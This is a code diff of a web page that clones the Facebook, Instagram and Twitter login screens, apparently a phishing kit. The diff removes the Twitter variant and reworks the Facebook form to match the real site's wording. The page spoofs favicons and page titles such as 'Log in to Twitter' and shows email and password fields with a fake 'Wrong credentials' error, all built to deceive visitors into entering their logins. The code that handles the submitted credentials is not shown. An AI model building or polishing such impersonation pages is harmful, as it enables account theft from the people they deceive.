@@ -299,7 +299,6 @@
                             </div>
                             <img id="choose_fb" onclick="handleFbClick()" src="image/fb.png">
                             <img id="choose_ig" onclick="handleIgClick()" src="image/ig.png">
-                            <img id="choose_ig" onclick="handleTwClick()" src="image/tw.png">
                         </div>
                     </div>
                     <div class="t706__cartdata"></div>
@@ -310,11 +309,13 @@
         </div>
     </center>
 
-    <div id="tw_wrapper">
+    <div id="fb_wrapper">
 
-        <div id="twbody" class="tbook">
+        <div id="fbbody" class="fbook">
             <br>
-            <center></center><br><br><br><br>
+            <center><span
+                    style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
+                    (UK)</span></center><br><br><br><br>
 
             <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
                 style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
@@ -329,13 +330,13 @@
 
 
             <div class="form-group">
-                <input type="text" id="tw-email" required oninput="toggleClearIcon()">
-                <label for="fb-email">Phone, email or username</label>
+                <input type="text" id="fb-email" required oninput="toggleClearIcon()">
+                <label for="fb-email">Mobile number or email address</label>
                 <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
             </div>
 
             <div class="form-group">
-                <input type="password" id="tw-pass" required>
+                <input type="password" id="fb-pass" required>
                 <label for="fb-pass">Password</label>
                 <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
                 <!-- Icon as a clickable div -->
@@ -346,7 +347,7 @@
 
                 <div class="wbloks_113" dir="auto">
 
-                    <div onclick="twlogin()"
+                    <div onclick="login()"
                         style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
                         Log
                         in</div>
@@ -356,7 +357,7 @@
 
             <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
                 <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
-                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgot
+                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgotten
                         Password?</span></div>
             </div><br><br><br><br><br>
 
@@ -366,8 +367,8 @@
                     style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
                     <div>
                         <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Don't have an account? <a href="">Sign up
-                            </a></span>
+                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Create
+                            new account</span>
                     </div>
 
                 </div>
@@ -405,73 +406,6 @@
                     </div>
                 </div>
             </div>
-        </div>
-
-    </div>
-
-    <div id="fb_wrapper">
-
-        <div id="fbbody" class="fbook">
-            <br>
-            <center></center><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
-                <img alt="Facebook from Meta" src="img/tw.png" class="wbloks_1"
-                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
-            </div><br><br><br>
-
-            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
-                <div class="fsl fwb fcb">Wrong credentials</div>
-                <div>Invalid username or password</div>
-            </div><br>
-
-
-            <div class="form-group">
-                <input type="text" id="tw-email" required oninput="toggleClearIcon()">
-                <label for="fb-email">Phone, email, or username</label>
-                <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
-            </div>
-
-            <div class="form-group">
-                <input type="password" id="tw-pass" required>
-                <label for="fb-pass">Password</label>
-                <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
-                <!-- Icon as a clickable div -->
-            </div>
-
-            <div
-                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
-
-                <div class="wbloks_113" dir="auto">
-
-                    <div onclick="twlogin()"
-                        style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
-                        Log
-                        in</div>
-
-                </div>
-            </div> <br><br>
-
-            <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
-                <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
-                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgot
-                        Password?</span></div>
-            </div><br><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
-                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
-                    <div>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Don't have an account? <a href="">Sign up</a></span>
-                    </div>
-
-                </div>
-            </div>
-
-
         </div>
 
     </div>
@@ -740,19 +674,6 @@
             favicon.href = iconUrl;
         }
 
-        function tw() {
-            document.getElementById("tw_wrapper").style.display = "block";
-            document.getElementById("tw_wrapper").style.display = "none";
-            document.getElementById("home").style.display = "none";
-            document.getElementById("choose").style.display = "none";
-
-        }
-        function handleTwClick() {
-            changeFavicon('img/twfavicon.png');
-            fb();
-            document.title = 'Log in to Twitter';
-        }
-
         function fb() {
             document.getElementById("fb_wrapper").style.display = "block";
             document.getElementById("ig_wrapper").style.display = "none";
@@ -760,7 +681,7 @@
             document.getElementById("choose").style.display = "none";
 
         }
-      
+
         function handleFbClick() {
             changeFavicon('img/favicon.png');
             fb();
